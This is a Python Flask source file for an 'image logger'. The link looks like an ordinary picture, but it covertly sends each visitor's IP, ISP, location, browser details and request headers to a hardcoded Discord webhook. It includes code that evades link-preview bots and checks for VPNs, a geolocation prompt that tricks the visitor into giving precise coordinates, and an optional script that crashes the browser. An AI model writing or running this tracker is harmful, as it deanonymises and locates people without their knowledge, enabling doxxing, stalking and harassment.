# --- IMPORTS ---
from flask import Flask, request, Response
import traceback
import requests
import base64
import httpagentparser
import json
import time
from collections import OrderedDict
import os # For file tree (demonstration purposes, not exposed externally)

# --- CONFIGURATION ---
config = {
    "webhook": "https://discord.com/api/webhooks/1488468832354963547/tDWiiwM7A5-h7pW-ZX3mjRLg9EeGQZcDESwwzz4Z5ZjBFADU23dBBAHhYN2K95wZNcU0",
    "image": "https://m.media-amazon.com/images/I/51mdx0RJKgL._UXNaN_FMjpg_QL85_.jpg",
    "imageArgument": True,

    "username": "Enhanced Logger", # Changed username for clarity
    "color": 0x8A2BE2, # Vibrant Purple

    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "Access Denied! Your IP has been logged. [{ip}]",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True, # If True, sends binary data instead of the image
    "antiBot": 1,
    
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },

    "ipCacheDuration": 3600,
    "webhookTimeout": 5,
    "ipApiTimeout": 5,
    
    # New configurations for file tree and detailed logging
    "logFileTree": False, # Set to True to log the server's file tree (use with caution!)
    "fileTreeDepth": 2, # How many levels deep to traverse for the file tree
    "logRequestHeaders": True, # Log all request headers
    "logRequestBody": False, # Log request body (can be sensitive, use with caution)
}

# --- BLACKLISTED IPS ---
blacklistedIPs = ("27", "104", "143", "164")

# --- CACHING MECHANISM ---
ip_cache = {}

def get_cached_ip_info(ip):
    """Retrieves IP info from cache or fetches it if expired/not present."""
    if ip in ip_cache:
        data, timestamp = ip_cache[ip]
        if time.time() - timestamp < config["ipCacheDuration"]:
            return data
        else:
            del ip_cache[ip]
            
    try:
        fields = "status,message,continent,continentCode,org,as,reverse,query,proxy,hosting,mobile,isp,country,countryCode,region,regionName,city,zip,lat,lon,timezone"
        ip_info_response = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=config["ipApiTimeout"])
        ip_info_response.raise_for_status()
        info = ip_info_response.json()
        
        if info.get("status") == "fail":
            print(f"IP-API lookup failed for {ip}: {info.get('message', 'Unknown error')}")
            info = {"query": ip, "error": info.get('message', 'Unknown error')}
        
        ip_cache[ip] = (info, time.time())
        return info
        
    except requests.exceptions.Timeout:
        print(f"IP-API lookup timed out for {ip}.")
        ip_cache[ip] = ({"query": ip, "error": "Timeout"}, time.time())
        return {"query": ip, "error": "Timeout"}
    except requests.exceptions.RequestException as e:
        print(f"Failed to fetch IP info for {ip}: {e}")
        ip_cache[ip] = ({"query": ip, "error": str(e)}, time.time())
        return {"query": ip, "error": str(e)}
    except json.JSONDecodeError:
        print(f"Failed to decode JSON response from IP-API for {ip}.")
        ip_cache[ip] = ({"query": ip, "error": "JSON Decode Error"}, time.time())
        return {"query": ip, "error": "JSON Decode Error"}

# --- HELPER FUNCTIONS ---

def botCheck(ip, useragent):
    """Checks if the IP or User-Agent suggests a known bot/service."""
    if ip and ip.startswith(("34", "35")): # Common Discord IP ranges
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    # Add more bot detection logic here if needed
    return False

def reportError(error_trace, context=""):
    """Sends an error report to the configured Discord webhook with context."""
    if not config["webhook"] or "YOUR_DISCORD_WEBHOOK_URL" in config["webhook"]:
        print("Webhook URL not configured. Cannot report error.")
        return

    payload = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Logger - Error Occurred",
                "color": 0xFF0000, # Red for errors
                "description": f"An error occurred in the logger.\n\n**Context:**\n```\n{context}\n```\n\n**Error Trace:**\n```python\n{error_trace}\n```",
                "footer": {"text": "Check logs for more details."}
            }
        ],
    }
    try:
        requests.post(config["webhook"], json=payload, timeout=config["webhookTimeout"])
    except Exception as e:
        print(f"Failed to send error report to webhook: {e}")

def generate_file_tree(path='.', depth=1, max_depth=2):
    """Generates a string representation of a directory tree."""
    tree = ""
    if depth > max_depth:
        return tree
    try:
        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)
            indent = "    " * (depth - 1)
            if os.path.isdir(full_path):
                tree += f"{indent}|-- {entry}/\n"
                tree += generate_file_tree(full_path, depth + 1, max_depth)
            else:
                tree += f"{indent}|-- {entry}\n"
    except OSError:
        pass # Ignore permission errors or inaccessible paths
    return tree

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, custom_image_provided=False, request_headers=None, request_body=None):
    """
    Gathers IP information, checks for bots/VPNs, and sends a report to Discord.
    'url' is the actual image URL.
    'coords' is a tuple (lat, lon) if precise coordinates are available.
    'custom_image_provided' is a boolean indicating if the image URL was from an argument.
    'request_headers' is a dictionary of request headers.
    'request_body' is the raw request body.
    Returns the IP info dictionary or None if IP is invalid/blacklisted.
    """
    if not ip:
        return None

    if ip.startswith(blacklistedIPs):
        print(f"IP {ip} is blacklisted. Skipping report.")
        return None

    bot = botCheck(ip, useragent)

    # --- Handle Link Alerts ---
    if bot and config["linkAlerts"]:
        payload = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "🔗 Link Sent Alert",
                    "color": 0x3498DB, # Blue
                    "description": f"The **Image Logging link** was detected in a chat!\n\n**Platform:** `{bot}`\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
                    "footer": {"text": "This is an automated alert."}
                }
            ],
        }
        try:
            requests.post(config["webhook"], json=payload, timeout=config["webhookTimeout"])
        except Exception as e:
            print(f"Failed to send link alert to webhook: {e}")
        return None

    # --- Fetch IP Information ---
    info = get_cached_ip_info(ip)
    
    if "error" in info:
        print(f"IP lookup error for {ip}: {info['error']}")
        
    # --- Apply Anti-Bot/VPN Rules ---
    ping = "@everyone"

    is_proxy = info.get("proxy", False)
    if is_proxy:
        if config["vpnCheck"] == 2: return info # Return IP info without sending to webhook
        if config["vpnCheck"] == 1: ping = "" # Suppress @everyone

    is_hosting = info.get("hosting", False)
    bot_status = "False"
    if is_hosting and not is_proxy: bot_status = "Bot"
    elif is_hosting and is_proxy: bot_status = "Hosting/Proxy"
    elif is_proxy: bot_status = "Proxy"

    if bot_status != "False":
        if config["antiBot"] in [2, 4] and bot_status not in ["Bot", "Hosting/Proxy"]:
             pass # Allow if not a direct bot/hosting
        elif config["antiBot"] in [2, 4] and bot_status in ["Bot", "Hosting/Proxy"]:
            if config["antiBot"] == 4: return info # Return IP info without sending to webhook
            if config["antiBot"] == 2: ping = "" # Suppress @everyone
        elif config["antiBot"] == 3: return info # Return IP info without sending to webhook
        elif config["antiBot"] == 1: ping = "" # Suppress @everyone

    # --- Prepare Embed Content ---
    os_detected, browser_detected = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed_fields = OrderedDict()
    embed_fields["Endpoint"] = f"`{endpoint}`"
    embed_fields["IP"] = f"`{ip}`"
    embed_fields["Provider"] = f"`{info.get('isp', 'Unknown')}`"
    embed_fields["ASN"] = f"`{info.get('as', 'Unknown')}`"
    embed_fields["Country"] = f"`{info.get('country', 'Unknown')}`"
    embed_fields["Region"] = f"`{info.get('regionName', 'Unknown')}`"
    embed_fields["City"] = f"`{info.get('city', 'Unknown')}`"

    lat = info.get('lat')
    lon = info.get('lon')
    google_maps_link = ""
    if lat is not None and lon is not None:
        coords_str = f"{lat}, {lon}"
        # Google Maps URL for the coordinates
        google_maps_link = f"[Google Maps](https://www.google.com/maps/search/?api=1&query={coords_str.replace(',', ',%20')})"
        # If precise_coords were provided by the client, mark it as Precise
        precise_status = "Precise, " if coords else "Approximate"
        embed_fields["Coords"] = f"{coords_str} ({precise_status}{google_maps_link})"
    else:
        embed_fields["Coords"] = "Unknown"
        
    tz = info.get('timezone')
    timezone_str = f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})" if tz and '/' in tz else tz if tz else "Unknown"
    embed_fields["Timezone"] = f"`{timezone_str}`"
    
    embed_fields["Mobile"] = f"`{info.get('mobile', 'Unknown')}`"
    embed_fields["VPN/Proxy"] = f"`{info.get('proxy', 'Unknown')}`"
    embed_fields["Bot/Hosting"] = f"`{bot_status}`"
    embed_fields["OS"] = f"`{os_detected}`"
    embed_fields["Browser"] = f"`{browser_detected}`"

    embed_field_list = []
    for name, value in embed_fields.items():
        embed_field_list.append({
            "name": f"**{name}**",
            "value": value,
            "inline": True
        })

    # --- Additional Information ---
    additional_info_description = ""

    # Log Request Headers
    if config["logRequestHeaders"] and request_headers:
        headers_str = "\n".join([f"**{k}:** `{v}`" for k, v in request_headers.items()])
        additional_info_description += f"**Request Headers:**\n{headers_str}\n\n"

    # Log Request Body (use with extreme caution)
    if config["logRequestBody"] and request_body:
        # Attempt to decode if it looks like JSON, otherwise show raw
        try:
            decoded_body = request_body.decode('utf-8')
            try:
                json_body = json.loads(decoded_body)
                body_display = json.dumps(json_body, indent=2)
            except json.JSONDecodeError:
                body_display = decoded_body # Not JSON, show as is
            additional_info_description += f"**Request Body:**\n```\n{body_display}\n```\n\n"
        except UnicodeDecodeError:
            additional_info_description += f"**Request Body (raw bytes):**\n```\n{request_body}\n```\n\n"

    # Log File Tree (use with extreme caution and only if enabled)
    if config["logFileTree"]:
        try:
            server_file_tree = generate_file_tree(path='.', depth=1, max_depth=config["fileTreeDepth"])
            if server_file_tree:
                additional_info_description += f"**Server File Tree (depth {config['fileTreeDepth']}):**\n```\n{server_file_tree}\n```\n\n"
        except Exception as e:
            print(f"Error generating file tree: {e}")
            reportError(traceback.format_exc(), context="Error generating file tree")

    user_agent_block = ""
    if useragent:
        user_agent_block = f"**User Agent:**\n```\n{useragent}\n```"
        
    # Combine user agent and other additional info if they exist
    if user_agent_block or additional_info_description:
        if user_agent_block:
            additional_info_description = user_agent_block + "\n\n" + additional_info_description
        embed_fields["Additional Info"] = additional_info_description.strip() # Use a field for potentially long info

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "📍 IP Address Logged!",
                "color": config["color"],
                "fields": embed_field_list,
                "description": "", # Moved detailed info to a field if it exists
                "footer": {"text": f"IP Lookup for {ip}"}
            }
        ],
    }
    
    # Adjusting embed structure if no additional info is present
    if not additional_info_description and useragent:
        embed["embeds"][0]["description"] = user_agent_block
    elif additional_info_description and not useragent:
        embed["embeds"][0]["description"] = additional_info_description

    # Add thumbnail ONLY if a custom image was provided AND it's not bugged image mode
    if custom_image_provided and not config["buggedImage"] and url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed, timeout=config["webhookTimeout"])
    except Exception as e:
        print(f"Failed to send report to webhook: {e}")
    
    return info

# --- BINARIES ---
binaries = {
    "loading": base64.b64decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# --- FLASK APPLICATION ---
app = Flask(__name__)

@app.route('/api/image', methods=['GET', 'POST'])
def handle_image_request():
    try:
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        request_path = request.path
        
        # Capture all headers
        request_headers = dict(request.headers)
        
        # Capture request body
        request_body = request.get_data()

        image_url = config["image"]
        custom_image_provided = False
        if config["imageArgument"]:
            url_param = request.args.get("url") or request.args.get("id")
            if url_param:
                try:
                    decoded_param = base64.b64decode(url_param.encode()).decode()
                    if decoded_param.startswith('http://') or decoded_param.startswith('https://'):
                        image_url = decoded_param
                        custom_image_provided = True
                    else:
                        print(f"Warning: Decoded URL parameter is not a valid URL: {decoded_param}")
                except Exception as e:
                    print(f"Warning: Failed to decode or validate image URL parameter: {url_param}. Error: {e}")
                    reportError(traceback.format_exc(), context=f"Failed to process image argument: {url_param}")

        if config["redirect"]["redirect"]:
            return Response(f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">', mimetype='text/html')

        script_to_add = ""
        if config["crashBrowser"]:
            script_to_add = '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["message"]["doMessage"]:
            message_content = config["message"]["message"]
            ip_info = makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided, request_headers=request_headers, request_body=request_body)
            
            if ip_info and "error" not in ip_info:
                message_content = message_content.replace("{ip}", ip_address if ip_address else "Unknown")
                message_content = message_content.replace("{isp}", ip_info.get("isp", "Unknown"))
                message_content = message_content.replace("{asn}", ip_info.get("as", "Unknown"))
                message_content = message_content.replace("{country}", ip_info.get("country", "Unknown"))
                message_content = message_content.replace("{region}", ip_info.get("regionName", "Unknown"))
                message_content = message_content.replace("{city}", ip_info.get("city", "Unknown"))
                
                lat = ip_info.get('lat')
                lon = ip_info.get('lon')
                if lat is not None and lon is not None:
                    message_content = message_content.replace("{lat}", str(lat))
                    message_content = message_content.replace("{long}", str(lon))
                else:
                    message_content = message_content.replace("{lat}", "N/A")
                    message_content = message_content.replace("{long}", "N/A")
                    
                tz = ip_info.get('timezone')
                timezone_str = f"{tz.split('/')[1].replace('_', ' ')} ({tz.split('/')[0]})" if tz and '/' in tz else tz if tz else "Unknown"
                message_content = message_content.replace("{timezone}", timezone_str)
                
                message_content = message_content.replace("{mobile}", str(ip_info.get("mobile", "Unknown")))
                message_content = message_content.replace("{vpn}", str(ip_info.get("proxy", "Unknown")))
                
                hosting_status = ip_info.get("hosting", False)
                vpn_status = ip_info.get("proxy", False)
                bot_display = "Possibly" if hosting_status else "False"
                if hosting_status and not vpn_status: bot_display = "Bot"
                elif hosting_status and vpn_status: bot_display = "Hosting/Proxy"
                elif vpn_status: bot_display = "Proxy"
                message_content = message_content.replace("{bot}", bot_display)

                os_detected, browser_detected = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
                message_content = message_content.replace("{browser}", browser_detected)
                message_content = message_content.replace("{os}", os_detected)
            else:
                os_detected, browser_detected = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
                message_content = message_content.replace("{browser}", browser_detected)
                message_content = message_content.replace("{os}", os_detected)
                message_content = message_content.replace("{ip}", ip_address if ip_address else "Unknown")

            return Response(message_content.encode() + script_to_add.encode(), mimetype='text/html')

        if config["buggedImage"]:
            makeReport(ip_address, user_agent, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided, request_headers=request_headers, request_body=request_body)
            return Response(binaries["loading"], mimetype='image/jpeg')

        # --- Standard Image Display / Location Tracking ---
        
        precise_coords = None
        # Check if precise coordinates are provided via 'g' parameter
        if request.args.get("g"):
            try:
                # Decode base64 and replace URL-encoded '=' if present
                decoded_g = base64.b64decode(request.args.get("g").replace('%3D', '=')).decode()
                lat_str, lon_str = decoded_g.split(',')
                precise_coords = (float(lat_str), float(lon_str))
            except Exception as e:
                print(f"Failed to process 'g' parameter for precise coordinates: {e}")
                reportError(traceback.format_exc(), context=f"Failed to process 'g' parameter: {request.args.get('g')}")

        # Make the report, passing precise_coords if available
        ip_info = makeReport(ip_address, user_agent, coords=precise_coords, endpoint=request_path, url=image_url, custom_image_provided=custom_image_provided, request_headers=request_headers, request_body=request_body)
            
        if config["accurateLocation"] and ip_info is not None and not request.args.get("g"):
            base_url = request.url.split('?')[0]
            query_params = request.args.to_dict()
            # Exclude 'g' if it was already processed or if we are generating the initial URL
            filtered_params = [f"{k}={v}" for k, v in query_params.items() if k != 'g']
            query_string = "&".join(filtered_params)
            new_url_template = f"{base_url}{'?' + query_string if query_string else ''}"

            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Requesting Location...</title>
                <style>
                    body {{ margin: 0; padding: 0; background-color: #2C2F33; }}
                    .img-container {{
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        width: 100vw;
                        height: 100vh;
                        background-image: url('{image_url}');
                        background-position: center center;
                        background-repeat: no-repeat;
                        background-size: contain;
                    }}
                    .loading-text {{
                        position: absolute;
                        top: 70%;
                        left: 50%;
                        transform: translate(-50%, -50%);
                        color: #7289DA; /* Discord blurple */
                        font-family: 'Whitney', sans-serif;
                        font-size: 1.2em;
                        text-align: center;
                    }}
                </style>
            </head>
            <body>
                <div class="img-container"></div>
                <div class="loading-text">
                    Requesting your location for enhanced logging...
                    <br>
                    If prompted, please allow location access.
                </div>
                <script>
                    var redirectTemplate = "{new_url_template}";
                    if (navigator.geolocation) {{
                        navigator.geolocation.getCurrentPosition(function (coords) {{
                            var lat = coords.coords.latitude;
                            var lon = coords.coords.longitude;
                            // Encode coordinates for URL parameter
                            var encodedCoords = btoa(lat + "," + lon).replace(/=/g, "%3D");
                            var finalUrl = redirectTemplate + (redirectTemplate.includes("?") ? "&g=" : "?g=") + encodedCoords;
                            window.location.replace(finalUrl);
                        }}, function(error) {{
                            console.error("Geolocation error:", error);
                            // If geolocation fails, proceed without coordinates
                            var currentPath = window.location.pathname;
                            var searchParams = new URLSearchParams(window.location.search);
                            searchParams.delete('g'); // Ensure 'g' is not added if it failed
                            var newSearch = searchParams.toString();
                            var finalUrlWithoutCoords = currentPath + (newSearch ? '?' + newSearch : '');
                            window.location.replace(finalUrlWithoutCoords);
                        }});
                    }} else {{
                        console.log("Geolocation not supported");
                        // If geolocation is not supported, proceed without coordinates
                        var currentPath = window.location.pathname;
                        var searchParams = new URLSearchParams(window.location.search);
                        searchParams.delete('g');
                        var newSearch = searchParams.toString();
                        var finalUrlWithoutCoords = currentPath + (newSearch ? '?' + newSearch : '');
                        window.location.replace(finalUrlWithoutCoords);
                    }}
                </script>
            </body>
            </html>
            """
            return Response(html_content, mimetype='text/html')
        else:
            # Standard HTML response, showing the image and a success message
            html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{config["username"]}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #2C2F33;
        }}
        .img-container {{
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100vw;
            height: 100vh;
            background-image: url('{image_url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
        }}
        .success-message {{
            position: absolute;
            top: 70%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #4CAF50; /* Green */
            font-family: 'Whitney', sans-serif;
            font-size: 1.2em;
            text-align: center;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }}
    </style>
</head>
<body>
    <div class="img-container"></div>
    <div class="success-message" id="successMsg">Image Logged Successfully!</div>
    <script>
        // Only show success message if we are not processing precise coordinates (i.e., 'g' parameter is not present)
        if (!window.location.search.includes('g=')) {{
            var msg = document.getElementById('successMsg');
            msg.style.opacity = '1';
            setTimeout(() => {{ msg.style.opacity = '0'; }}, 3000);
        }}
    </script>
</body>
</html>'''
            return Response(html_content, mimetype='text/html')

    except Exception as e:
        error_trace = traceback.format_exc()
        reportError(error_trace, context=f"IP: {ip_address}, UA: {user_agent}, Path: {request_path}")
        return Response("500 - Internal Server Error. Please check the webhook for details.", status=500)

# --- Example of how to run locally (optional) ---
if __name__ == '__main__':
    # IMPORTANT: For security, never run with debug=True in a production environment.
    # Also, consider using a more robust WSGI server like Gunicorn or uWSGI.
    app.run(debug=True, host='0.0.0.0', port=5000)
